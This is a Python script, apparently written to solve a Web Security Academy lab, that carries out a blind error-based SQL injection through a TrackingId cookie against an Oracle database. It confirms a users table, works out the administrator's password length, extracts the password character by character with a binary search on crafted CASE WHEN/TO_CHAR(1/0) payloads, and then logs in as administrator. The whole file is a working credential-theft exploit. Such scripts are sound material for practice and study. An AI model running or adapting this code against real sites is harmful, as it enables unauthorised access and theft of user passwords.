import urllib3
import requests
from bs4 import BeautifulSoup
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

apostrophe = "'"
space = " "
equal = "="
where = "WHERE"
select = "SELECT"
aand = "AND"
froom = "FROM"
substr = "SUBSTR"
username = "username"
password = "password"
administrator = "administrator"
table_name = "users"


pipe        = "||"
case_when   = "CASE WHEN"
then        = "THEN"
else_       = "ELSE"
end         = "END"
to_char_div = "TO_CHAR(1/0)"
empty       = "''"
one         = "1"


def check_wrong_login(text):
    soup = BeautifulSoup(text, "html.parser")
    error_tag = soup.find('p', class_="is-warning")
    if error_tag:
        error = error_tag.get_text().strip()
    else:
        error = None
    if error == "Invalid username or password.":
        return False
    return True


def csrf_getter(session, url):
    resp = session.get(url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]


def cookie_getter(session, url):
    resp = session.get(url, verify=False)
    tracking_id = resp.cookies.get('TrackingId')
    session_tok  = resp.cookies.get('session')
    return [tracking_id, session_tok]


def check_condition(session, url, cookies, condition, from_clause):
    cookie = {
        "TrackingId" : cookies[0],
        "session"    : cookies[1]
    }

    payload = (apostrophe + pipe +
               '(' + select + space + case_when + space + condition + space +
               then + space + to_char_div + space +
               else_ + space + empty + space + end + space +
               froom + space + from_clause + ')' +
               pipe + apostrophe)

    cookie["TrackingId"] = cookies[0] + payload
    print(f'Trying {cookie["TrackingId"]} ...')
    resp = session.get(url, cookies=cookie, verify=False)
    return resp.status_code == 500  


def vulnerability_checker(session, url, cookies):
    return check_condition(session, url, cookies, condition="1=1", from_clause="dual")


def verifying_table_name(session, url, cookies):
    return check_condition(session, url, cookies, condition="1=1", from_clause=table_name + space + "LIMIT" + space + one)


def verifying_username(session, url, cookies):
    return check_condition(session, url, cookies, condition=username + equal + apostrophe + administrator + apostrophe,
        from_clause=table_name + space + where + space + username + equal + apostrophe + administrator + apostrophe)


def length_of_password(session, url, cookies):
    i = 1
    while True:
        condition   = f"LENGTH({password})>{i}"
        from_clause = (table_name + space + where + space +
                       username + equal + apostrophe + administrator + apostrophe)

        if not check_condition(session, url, cookies, condition, from_clause):
            print(f'[+] Password length: {i}')
            return i
        i += 1


def determining_password(session, url, cookies, pwd_length):
    safe_symbols = ''.join(c for c in string.punctuation if c not in "'\\\"")
    charset      = sorted(string.ascii_lowercase + string.digits + string.ascii_uppercase + safe_symbols)
    result       = ""

    for i in range(1, pwd_length + 1):
        lo, hi     = 0, len(charset) - 1
        found_char = None

        while lo <= hi:
            mid   = (lo + hi) // 2
            guess = charset[mid]

            from_clause = (table_name + space + where + space + username + equal + apostrophe + administrator + apostrophe)

           
            condition_gt = (substr + '(' + password + ',' + str(i) + ',1)' + '>' + apostrophe + guess + apostrophe)

            if check_condition(session, url, cookies, condition_gt, from_clause):
                lo = mid + 1
            else:
                
                condition_eq = (substr + '(' + password + ',' + str(i) + ',1)' + equal + apostrophe + guess + apostrophe)

                if check_condition(session, url, cookies, condition_eq, from_clause):
                    found_char = guess
                    break
                else:
                    hi = mid - 1

        if found_char is None:
            print(f'[!] Could not find char at position {i}, stopping.')
            break

        result += found_char
        print(f'[+] Position {i:02d}: {found_char}  →  {result}')

    return result


def main():
    url     = "https://0a63004104a45e068041f37e000a00df.web-security-academy.net"
    session = requests.Session()

    print("[*] Getting cookies...")
    cookies = cookie_getter(session, url)
    print(f"    TrackingId : {cookies[0]}")
    print(f"    session    : {cookies[1]}")

    print("\n[*] Checking vulnerability...")
    if not vulnerability_checker(session, url, cookies):
        print("[!] Target does not appear vulnerable. Exiting.")
        exit(1)
    print("[+] Vulnerable!\n")

    print("[*] Verifying table name...")
    if not verifying_table_name(session, url, cookies):
        print("[!] Table 'users' not found.")
        exit(1)
    print("[+] Table confirmed.\n")

    print("[*] Verifying username...")
    if not verifying_username(session, url, cookies):
        print("[!] User 'administrator' not found.")
        exit(1)
    print("[+] Username confirmed.\n")

    print("[*] Finding password length...")
    pwd_length = length_of_password(session, url, cookies)

    print(f"\n[*] Extracting password ({pwd_length} chars)...")
    pwd = determining_password(session, url, cookies, pwd_length)

    print(f"\n[✓] Password: {pwd}")

    login_url = f'{url}/login'
    csrf      = csrf_getter(session, login_url)
    creds     = {"csrf": csrf, "username": "administrator", "password": pwd}
    r         = session.post(login_url, data=creds, verify=False)

    if check_wrong_login(r.text):
        print("Koated !!")
    else:
        print("ya siks")


if __name__ == "__main__":
    main()